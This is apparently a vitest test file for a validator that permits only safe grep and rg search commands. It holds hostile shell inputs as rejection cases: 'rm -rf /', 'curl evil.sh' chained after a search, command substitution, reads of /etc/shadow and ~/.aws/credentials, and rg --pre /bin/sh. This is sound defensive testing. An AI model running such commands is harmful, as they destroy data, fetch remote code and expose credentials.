import { describe, expect, it } from "vitest";

import { isSafeSearchCommand, parseSearchCommand, relaxPlan } from "./commandSafety";

describe("isSafeSearchCommand", () => {
  it("allows a plain grep", () => {
    expect(isSafeSearchCommand("grep -rn '@shareable' services/")).toEqual({
      safe: true,
    });
  });

  it("allows rg", () => {
    expect(isSafeSearchCommand("rg --count-matches foo libs/")).toEqual({
      safe: true,
    });
  });

  it("allows a grep-to-grep pipeline", () => {
    expect(isSafeSearchCommand("grep -rn 'x' services/ | grep enum")).toEqual({
      safe: true,
    });
  });

  it.each([
    ["chaining with ;", "grep -rn 'x' . ; rm -rf /"],
    ["chaining with &&", "grep -rn 'x' . && curl evil.sh"],
    ["chaining with ||", "grep -rn 'x' . || echo pwned"],
    ["command substitution", 'grep -rn "$(whoami)" .'],
    ["redirection out", "grep -rn 'x' . > /etc/passwd"],
    ["redirection in", "grep -rn pattern < /etc/passwd"],
  ])("rejects %s", (_label, command) => {
    const verdict = isSafeSearchCommand(command);
    expect(verdict.safe).toBe(false);
  });

  it("rejects a backtick", () => {
    const verdict = isSafeSearchCommand("grep -rn `whoami` .");
    expect(verdict.safe).toBe(false);
  });

  it("rejects a non-allowlisted binary even without metacharacters", () => {
    const verdict = isSafeSearchCommand("cat /etc/passwd");
    expect(verdict).toEqual({
      safe: false,
      reason: "segment 'cat /etc/passwd' does not begin with grep or rg",
    });
  });

  it("rejects a dangerous binary hidden in a later pipeline segment", () => {
    const verdict = isSafeSearchCommand("grep -rn 'x' . | xargs rm");
    expect(verdict.safe).toBe(false);
  });

  it("rejects a binary whose name merely starts with grep", () => {
    const verdict = isSafeSearchCommand("grepevil -rn x .");
    expect(verdict.safe).toBe(false);
  });

  it("rejects an empty command", () => {
    expect(isSafeSearchCommand("   ")).toEqual({
      safe: false,
      reason: "command is empty",
    });
  });
});

describe("isSafeSearchCommand — flag allowlist", () => {
  // Allowlisting the binary is not enough: these all begin with `rg`.
  it.each([
    ["--pre executes an arbitrary command per file", "rg --pre /bin/sh needle file.ts"],
    ["--pre with = form", "rg --pre=/bin/sh needle file.ts"],
    ["--pre-glob", "rg --pre-glob '*.ts' needle src/"],
    ["--hostname-bin executes a binary", "rg --hostname-bin /bin/sh needle src/"],
    ["-z shells out to decompressors", "rg -z needle src/"],
    ["--search-zip", "rg --search-zip needle src/"],
    ["-f reads an arbitrary pattern file", "rg -f /etc/passwd src/"],
    ["--file reads an arbitrary pattern file", "rg --file /etc/passwd src/"],
    ["--ignore-file reads an arbitrary file", "rg --ignore-file /etc/passwd needle src/"],
    ["--files turns the check into a directory oracle", "rg --files src/"],
    ["-L follows symlinks out of the repo", "rg -L needle src/"],
  ])("refuses rg %s", (_label, command) => {
    expect(isSafeSearchCommand(command).safe).toBe(false);
  });

  it.each([
    ["-f reads an arbitrary pattern file", "grep -rn -f /etc/passwd src/"],
    ["--exclude-from reads an arbitrary file", "grep -rn --exclude-from=/etc/passwd x src/"],
    ["-q makes every absence claim trivially zero", "grep -rq needle src/"],
  ])("refuses grep %s", (_label, command) => {
    expect(isSafeSearchCommand(command).safe).toBe(false);
  });

  it("refuses an unknown flag rather than passing it through", () => {
    const verdict = isSafeSearchCommand("rg --some-new-flag needle src/");
    expect(verdict.safe).toBe(false);
    if (!verdict.safe) expect(verdict.reason).toContain("allowlist");
  });

  it("refuses a dangerous flag hidden in a short cluster", () => {
    expect(isSafeSearchCommand("rg -inz needle src/").safe).toBe(false);
  });

  it("still allows the ordinary search flags authors actually use", () => {
    for (const command of [
      "grep -rn --include='*.graphqls' '@shareable' services/",
      "grep -rn -e 'pattern with spaces' src/",
      "rg -n --glob '!*.test.ts' 'createUser' src/",
      "rg --count-matches -t ts legacyHelper src/",
      "grep -rn 'x' services/ | grep enum",
      "grep -rnA3 needle src/",
    ]) {
      expect(isSafeSearchCommand(command), command).toEqual({ safe: true });
    }
  });
});

describe("isSafeSearchCommand — path operands", () => {
  it.each([
    ["absolute path", "grep -rc AKIAZZTOPSECRET /etc/shadow"],
    ["traversal", "grep -rc secret ../../../etc/shadow"],
    ["home-relative", "grep -rc secret ~/.aws/credentials"],
    ["absolute path behind -e", "grep -rc -e secret /etc/shadow"],
    ["absolute path in a later segment", "grep -rn x src/ | grep -c y /etc/shadow"],
    ["rg absolute path", "rg --count secret /etc/shadow"],
  ])("refuses %s — the absence lane is a file-probe oracle without this", (_label, command) => {
    expect(isSafeSearchCommand(command).safe).toBe(false);
  });

  it("does not mistake the pattern for a path", () => {
    // `/etc/passwd` here is the regex, not an operand — it is never opened.
    expect(isSafeSearchCommand("grep -rn /etc/passwd src/")).toEqual({ safe: true });
  });

  it("refuses variable expansion outside single quotes", () => {
    expect(isSafeSearchCommand("grep -rc AKIA $SECRET_FILE").safe).toBe(false);
    expect(isSafeSearchCommand('grep -rc "$SECRET_FILE" src/').safe).toBe(false);
  });

  it("allows $ as a regex anchor inside single quotes", () => {
    expect(isSafeSearchCommand("grep -rn 'foo$' src/")).toEqual({ safe: true });
  });
});

describe("parseSearchCommand", () => {
  it("hands back argv, never a command string", () => {
    const result = parseSearchCommand("grep -rn 'two words' src/");
    expect(result.safe).toBe(true);
    if (result.safe) {
      expect(result.plan.segments).toEqual([
        { binary: "grep", args: ["-rn", "two words", "src/"], patternIndex: 1 },
      ]);
    }
  });

  it("splits a pipeline into separately validated segments", () => {
    const result = parseSearchCommand("grep -rn x src/ | grep enum");
    expect(result.safe).toBe(true);
    if (result.safe) expect(result.plan.segments).toHaveLength(2);
  });

  it("rejects an unterminated quote instead of guessing", () => {
    expect(parseSearchCommand("grep -rn 'unclosed src/").safe).toBe(false);
  });
});

describe("relaxPlan", () => {
  it("cuts the pattern back to a fragment of its longest identifier", () => {
    const parsed = parseSearchCommand("rg --count legacyRetryHelper src/");
    expect(parsed.safe).toBe(true);
    if (!parsed.safe) return;

    const relaxed = relaxPlan(parsed.plan);
    expect(relaxed).not.toBeNull();
    const pattern = relaxed?.segments[0]?.args[1] ?? "";
    expect("legacyRetryHelper".startsWith(pattern)).toBe(true);
    expect(pattern.length).toBeLessThan("legacyRetryHelper".length);
  });

  it("declines to relax a pattern too short to cut", () => {
    const parsed = parseSearchCommand("rg --count ab src/");
    expect(parsed.safe).toBe(true);
    if (parsed.safe) expect(relaxPlan(parsed.plan)).toBeNull();
  });
});
